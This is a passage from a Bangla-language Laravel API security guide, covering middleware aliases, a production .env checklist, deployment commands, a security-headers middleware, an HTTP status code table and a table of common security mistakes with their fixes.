            SanitizeInput::class,            // 5. Input Sanitization
        ]);

        // ── Named alias ──
        $middleware->alias([
            'api.key'        => AuthenticateApiKey::class,          // 2. API Keys
            'scopes'         => \Laravel\Passport\Http\Middleware\CheckScopes::class,   // 3. OAuth
            'scope'          => \Laravel\Passport\Http\Middleware\CheckForAnyScope::class,
            'client'         => \Laravel\Passport\Http\Middleware\CheckClientCredentials::class,
            'jwt'            => ValidateJwt::class,                 // 4. JWT
            'mtls'           => VerifyClientCertificate::class,     // 7. mTLS
            'signed.request' => VerifyRequestSignature::class,      // 8. Request Signing
            'webhook'        => VerifyWebhookSignature::class,      // 8. Webhook Signature
            'allow.ip'       => AllowedIpOnly::class,               // 9. IP Allowlisting
            'audit'          => AuditApiRequests::class,            // 10. Audit Logging
            'role'           => \App\Http\Middleware\CheckRole::class,
        ]);
    })
    ->withExceptions(function (Exceptions $exceptions) {
        // Production এ কখনো internal error detail ফাঁস করবেন না
        $exceptions->render(function (Throwable $e, Request $request) {
            if ($request->is('api/*') && ! config('app.debug')) {
                return response()->json([
                    'message'    => 'Server error.',
                    'request_id' => $request->header('X-Request-Id'),
                ], 500);
            }
        });
    })
    ->create();
```

> ⚠️ **Middleware এর ক্রম গুরুত্বপূর্ণ।** যেমন `throttle:api-key` অবশ্যই `api.key` এর **পরে** বসবে — নাহলে limiter এর ভেতরে `$request->attributes->get('api_key')` খালি পাবে। সাধারণ নিয়ম: **সস্তা check আগে, দামি check পরে** (IP check < signature verify < DB query)।

---

## Production Security Checklist

### 🔧 Environment (`.env`)

```env
# ── Application ──────────────────────────────
APP_ENV=production
APP_DEBUG=false                      # ⚠️ true থাকলে stack trace সহ সব কিছু ফাঁস হবে
APP_KEY=base64:...                   # php artisan key:generate
APP_URL=https://api.myshop.com

# ── Session & Cookie ─────────────────────────
SESSION_SECURE_COOKIE=true
SESSION_HTTP_ONLY=true
SESSION_SAME_SITE=lax

# ── Cache (Rate Limiting এর জন্য অপরিহার্য) ──
CACHE_STORE=redis
QUEUE_CONNECTION=redis

# ── CORS ─────────────────────────────────────
CORS_ALLOWED_ORIGINS=https://app.myshop.com
CORS_SUPPORTS_CREDENTIALS=false

# ── IP Allowlist ─────────────────────────────
ADMIN_ALLOWED_IPS=103.230.107.50
INTERNAL_ALLOWED_IPS=10.0.1.5,10.0.1.6

# ── Logging ──────────────────────────────────
LOG_CHANNEL=stack
LOG_LEVEL=warning                    # production এ debug নয়
LOG_SLACK_WEBHOOK_URL=https://hooks.slack.com/...
```

### ✅ Deployment এর আগে

```bash
# Config, route, view cache
php artisan config:cache
php artisan route:cache
php artisan event:cache

# ⚠️ dev dependency production এ যাবে না
composer install --no-dev --optimize-autoloader

# পরিচিত vulnerability আছে কিনা দেখুন
composer audit
```

### 📋 Layer-by-Layer Final Checklist

| # | Layer | সবচেয়ে জরুরি চেক |
|---|-------|--------------------|
| 1 | **Rate Limiting** | `/login`, `/otp` এ কড়া limit আছে; `CACHE_STORE=redis` |
| 2 | **API Keys** | DB তে hash করা; header এ পাঠানো হচ্ছে; scope + expiry আছে |
| 3 | **OAuth 2.0** | Scope define করা; token এর মেয়াদ ছোট; `passport:purge` scheduled |
| 4 | **JWT** | Algorithm নিজে fix করা; `exp`/`iss`/`aud` verify হচ্ছে |
| 5 | **Input Sanitization** | সব endpoint এ FormRequest; `validated()` ব্যবহার; `$fillable` আছে |
| 6 | **CORS** | নির্দিষ্ট origin; `*` + credentials একসাথে নেই |
| 7 | **mTLS** | `X-SSL-*` header Nginx এ overwrite হচ্ছে; `verify => false` কোথাও নেই |
| 8 | **Request Signing** | `hash_equals()` ব্যবহার; timestamp + nonce আছে |
| 9 | **IP Allowlisting** | `TrustProxies` নির্দিষ্ট; খালি list এ deny হয় |
| 10 | **Audit Logging** | Sensitive field redacted; log immutable |

### 🌐 Security Headers (Nginx বা Middleware)

```php
<?php
// app/Http/Middleware/SecurityHeaders.php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        $response->headers->add([
            'X-Content-Type-Options'    => 'nosniff',           // MIME sniffing বন্ধ
            'X-Frame-Options'           => 'DENY',              // Clickjacking প্রতিরোধ
            'Referrer-Policy'           => 'strict-origin-when-cross-origin',
            'Strict-Transport-Security' => 'max-age=31536000; includeSubDomains',  // HTTPS বাধ্যতামূলক
            'Permissions-Policy'        => 'geolocation=(), microphone=(), camera=()',
            'Content-Security-Policy'   => "default-src 'none'; frame-ancestors 'none'",  // API এর জন্য
        ]);

        // Server এর তথ্য লুকান
        $response->headers->remove('X-Powered-By');
        $response->headers->remove('Server');

        return $response;
    }
}
```

### 🚦 HTTP Status Code — কোনটা কখন

| Code | মানে | কখন ব্যবহার করবেন |
|------|------|--------------------|
| `200` | OK | সফল |
| `201` | Created | নতুন resource তৈরি হয়েছে |
| `400` | Bad Request | Malformed request (JSON ভাঙা) |
| `401` | Unauthorized | **Authentication নেই বা ভুল** (token নেই/invalid) |
| `403` | Forbidden | **Authenticated কিন্তু অনুমতি নেই** (scope/policy/IP) |
| `404` | Not Found | নেই — অথবা "আছে কিনা জানাতেই চাই না" |
| `422` | Unprocessable Entity | Validation failed |
| `429` | Too Many Requests | Rate limit পার হয়েছে |
| `500` | Internal Server Error | Server এর সমস্যা — **কখনো detail দেবেন না** |

> 💡 **401 vs 403 মনে রাখার সহজ উপায়:**
> **401** = "তুমি **কে** জানি না" → login করো
> **403** = "তুমি কে জানি, কিন্তু **এটা তোমার জন্য নয়**"

---

## সাধারণ ভুল গুলো

| ❌ ভুল | 💥 ফলাফল | ✅ সঠিক |
|--------|----------|---------|
| `APP_DEBUG=true` production এ | Database credential, file path, stack trace সব ফাঁস | `APP_DEBUG=false` |
| `$request->all()` → `create()` | Mass assignment — user নিজেকে admin বানাবে | `$request->validated()` |
| `$guarded = []` | নতুন column অরক্ষিত থেকে যাবে | `$fillable = [...]` |
| API key plain text এ DB তে | DB leak = সব key leak | `hash('sha256', $key)` |
| `allowed_origins => ['*']` + credentials | যেকোনো site cookie সহ API কল করবে | নির্দিষ্ট origin list |
| `$signature === $received` | Timing attack | `hash_equals()` |
| JWT payload শুধু decode | যে কেউ admin সেজে ঢুকবে | Signature + `exp` + `iss` + `aud` verify |
| `TrustProxies` এ `'*'` | IP spoofing — rate limit ও allowlist bypass | নির্দিষ্ট proxy IP |
| `'verify' => false` Guzzle এ | Man-in-the-middle attack | সঠিক CA bundle path |
| Rate limiting এ `by()` নেই | একজন limit শেষ করলে সবাই block | সবসময় `by()` দিন |
| `CACHE_STORE=file` multi-server এ | Rate limit ভেঙে যাবে | `redis` |
| Password/token log এ | Log leak = credential leak | Redact/mask করুন |
| URL query তে API key | Server log, browser history তে থেকে যাবে | Header এ পাঠান |
| Validation শুধু frontend এ | Postman দিয়ে সহজেই bypass | Backend এ অবশ্যই validate |
| Error message এ বেশি তথ্য | "এই email registered নেই" → user enumeration | Generic message |

---

## আরও পড়ুন

### 📁 এই Repository এর সম্পর্কিত গাইড

| গাইড | কি আছে |
|------|---------|
| [middleware-bangla-guide.md](../middleware-bangla-guide.md) | Middleware তৈরি, group, parameter, terminable middleware |
| [authentication-bangla-guide.md](../authentication-bangla-guide.md) | Sanctum, Guards, token-based auth, password reset |
| [authorization-bangla-guide.md](../authorization-bangla-guide.md) | Gates, Policies, `@can`, role-based access |
| [laravel-policy-bangla-guide.md](../laravel-policy-bangla-guide.md) | Policy গভীরভাবে |
| [laravel-ip-management-bangla-guide.md](../laravel-ip-management-bangla-guide.md) | GeoIP, auto IP blocking, IP reputation, honeypot |
| [request-response-bangla-guide.md](../request-response-bangla-guide.md) | FormRequest, validation rules, JSON response |
| [request-lifecycle-bangla-guide.md](../request-lifecycle-bangla-guide.md) | Kernel, Service Provider, middleware pipeline |
| [laravel-api-resource-complete-guide-bangla.md](../laravel-api-resource-complete-guide-bangla.md) | API Resource দিয়ে response তৈরি |
| [laravel-api-caching-complete-guide-bangla.md](../laravel-api-caching-complete-guide-bangla.md) | API caching strategy |
| [laravel-redis-complete-bangla-guide.md](../laravel-redis-complete-bangla-guide.md) | Redis setup (rate limiting এর জন্য দরকার) |
| [queues-jobs-bangla-guide.md](../queues-jobs-bangla-guide.md) | Queue (audit logging async করতে) |
| [events-listeners-bangla-guide.md](../events-listeners-bangla-guide.md) | Event/Listener (auth event log করতে) |
| [laravel-exception-handling-complete-notes.md](../laravel-exception-handling-complete-notes.md) | Exception handling, error response |
| [laravel-production-commands-guide-bangla.md](../laravel-production-commands-guide-bangla.md) | Production deployment command |

### 🔗 বাইরের রেফারেন্স

- [Laravel Rate Limiting](https://laravel.com/docs/routing#rate-limiting)
- [Laravel Sanctum](https://laravel.com/docs/sanctum)
- [Laravel Passport](https://laravel.com/docs/passport)
- [Laravel Validation](https://laravel.com/docs/validation)
- [Laravel Authorization](https://laravel.com/docs/authorization)
- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [JWT Best Current Practices (RFC 8725)](https://datatracker.ietf.org/doc/html/rfc8725)
- [MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

## 🎯 শেষ কথা

```
API Security একটা "কাজ" নয়, একটা "অভ্যাস"।

❌ "আমি security যোগ করে ফেলেছি, কাজ শেষ।"
✅ "প্রতিটা নতুন endpoint লেখার সময় ভাবি — এটার জন্য কোন কোন layer লাগবে?"

মনে রাখুন:
  • প্রতিটা layer আলাদা attack ঠেকায়
  • একটা layer fail করলে পরেরটা ধরবে
  • সবচেয়ে দুর্বল layer টাই আপনার আসল নিরাপত্তা
  • Security কখনো "সম্পূর্ণ" হয় না — এটা চলমান প্রক্রিয়া
```

**Defense in Layers — একটা তালা নয়, দশটা তালা। 🛡️**
